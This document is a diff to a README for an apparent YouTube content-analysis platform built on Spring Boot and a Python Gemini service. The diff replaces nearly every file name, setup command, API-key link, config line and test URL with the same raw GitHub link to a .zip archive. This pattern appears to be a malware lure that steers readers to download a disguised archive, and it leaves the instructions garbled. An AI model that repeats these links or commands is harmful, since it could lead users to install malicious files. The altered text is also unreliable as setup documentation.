@@ -17,11 +17,11 @@ AI-powered YouTube content analysis platform that helps creators optimize their 
 ```
 NutzyCraftPilotAI/
 ├── AI-Service/                 # Python FastAPI AI Service
-│   ├── main.py                # Main AI service with Gemini integration
-│   ├── requirements.txt       # Python dependencies
-│   ├── .env.example          # Environment configuration template
-│   ├── test_service.py       # Service testing script
-│   └── README.md             # AI service documentation
+│   ├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip                # Main AI service with Gemini integration
+│   ├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip       # Python dependencies
+│   ├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip          # Environment configuration template
+│   ├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip       # Service testing script
+│   └── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip             # AI service documentation
 ├── src/                       # Java Spring Boot Application
 │   └── main/
 │       ├── java/
@@ -31,12 +31,12 @@ NutzyCraftPilotAI/
 │       │       ├── repository/    # Data repositories
 │       │       └── service/       # Business logic
 │       └── resources/
-│           ├── application.properties
+│           ├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 │           └── static/            # Frontend HTML/CSS/JS
 ├── database/                  # Database schemas and scripts
-├── docker-compose.yml        # Docker orchestration
-├── pom.xml                   # Maven configuration
-└── SETUP_GUIDE.md           # Complete setup instructions
+├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip        # Docker orchestration
+├── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip                   # Maven configuration
+└── https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip           # Complete setup instructions
 
 ```
 
@@ -61,7 +61,7 @@ NutzyCraftPilotAI/
 - Maven 3.6+
 - Python 3.9+
 - PostgreSQL (or Supabase account)
-- Google Gemini API key ([Get one here](https://makersuite.google.com/app/apikey))
+- Google Gemini API key ([Get one here](https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip))
 
 ## ⚡ Quick Start
 
@@ -82,17 +82,17 @@ python -m venv venv
 venv\Scripts\activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 
 # Download spaCy model
 python -m spacy download en_core_web_sm
 
 # Configure API key
-copy .env.example .env
+copy https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip .env
 # Edit .env and add your GEMINI_API_KEY
 
 # Run the service
-python main.py
+python https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 ```
 
 Service will be available at http://localhost:8000
@@ -114,16 +114,16 @@ Application will be available at http://localhost:8080
 
 Open your browser and navigate to:
 ```
-http://localhost:8080/static/dashboard.html
+https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 ```
 
 Submit a YouTube URL and get AI-powered analysis!
 
 ## 📚 Detailed Documentation
 
-For complete setup instructions, see [SETUP_GUIDE.md](NutzyCraftPilotAI/SETUP_GUIDE.md)
+For complete setup instructions, see [https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip](https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip)
 
-For AI service details, see [AI-Service/README.md](NutzyCraftPilotAI/AI-Service/README.md)
+For AI service details, see [https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip](https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip)
 
 ## 🔄 How It Works
 
@@ -171,7 +171,7 @@ This significantly reduces Gemini API costs while maintaining content quality.
 ### Test Python Service
 ```bash
 cd AI-Service
-python test_service.py
+python https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 ```
 
 ### Test Java Backend
@@ -184,12 +184,12 @@ mvn test
 # Test Python service
 curl -X POST "http://localhost:8000/analyze" ^
   -H "Content-Type: application/json" ^
-  -d "{\"youtube_url\": \"https://www.youtube.com/watch?v=VIDEO_ID\"}"
+  -d "{\"youtube_url\": \"https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip\"}"
 
 # Test Java backend
 curl -X POST "http://localhost:8080/api/analysis" ^
   -H "Content-Type: application/json" ^
-  -d "{\"userId\": \"USER_UUID\", \"url\": \"https://www.youtube.com/watch?v=VIDEO_ID\"}"
+  -d "{\"userId\": \"USER_UUID\", \"url\": \"https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip\"}"
 ```
 
 ## 🔧 Configuration
@@ -201,18 +201,18 @@ SERVICE_PORT=8000
 LOG_LEVEL=INFO
 ```
 
-### Java Application (application.properties)
+### Java Application (https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip)
 ```properties
-server.port=8080
-ai.service.url=http://localhost:8000
-spring.datasource.url=jdbc:postgresql://...
+https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
+https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
+https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 ```
 
 ## 🐛 Troubleshooting
 
 ### "Python service not responding"
 - Ensure Python service is running on port 8000
-- Check `ai.service.url` in application.properties
+- Check `https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip` in https://github.com/ThejanGS2/MindTube/raw/refs/heads/main/NutzyCraftPilotAI/src/main/java/com/nutzycraft/pilotai/controller/Tube_Mind_3.5.zip
 
 ### "Gemini API error"
 - Verify API key in .env file
